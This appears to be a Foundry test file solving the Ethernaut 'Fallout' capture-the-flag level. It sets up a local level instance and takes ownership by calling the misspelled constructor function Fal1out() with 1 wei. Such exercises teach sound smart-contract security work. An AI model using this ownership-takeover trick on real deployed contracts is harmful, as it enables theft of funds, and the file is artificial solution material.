pragma solidity ^0.8.0;

import {FalloutFactory} from "../src/config/factories/2_FalloutFactory.sol";
import {Fallout} from "../src/2_Fallout/Fallout.sol";
import {Ethernaut} from "../src/config/Ethernaut.sol";
import "forge-std/Test.sol";

contract FalloutTest is Test {
    Ethernaut ethernaut;
    Fallout ethernautFallout;
    FalloutFactory falloutFactory;

    address levelAddress;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);

        falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);

        vm.startPrank(eoaAddress);
        levelAddress = ethernaut.createLevelInstance(falloutFactory);
        ethernautFallout = Fallout(payable(levelAddress));

    }

    function testExploit() public {
        /** EXPLOIT END **/

        ethernautFallout.Fal1out{value: 1 wei}(); //call miss-spelled constructor "Fal1out()" to become owner

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}